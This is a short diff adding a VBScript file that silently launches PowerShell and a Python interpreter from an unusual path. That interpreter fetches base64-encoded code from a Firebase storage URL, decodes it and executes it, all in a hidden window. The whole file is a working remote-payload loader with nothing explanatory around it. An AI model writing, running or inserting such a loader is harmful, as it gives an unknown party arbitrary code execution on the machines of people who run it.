@@ -1,0 +1,2 @@
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell -Command ""& 'C:\wininters\python.exe' -c """"import requests,base64;exec(base64.b64decode(requests.get('https://firebasestorage.googleapis.com/v0/b/xmeta-b0db4.firebasestorage.app/o/spamillnewx.txt?alt=media&token=3b21fd57-0889-48b4-ab98-704062f62086').content).decode('utf-8'))"""" """, 0
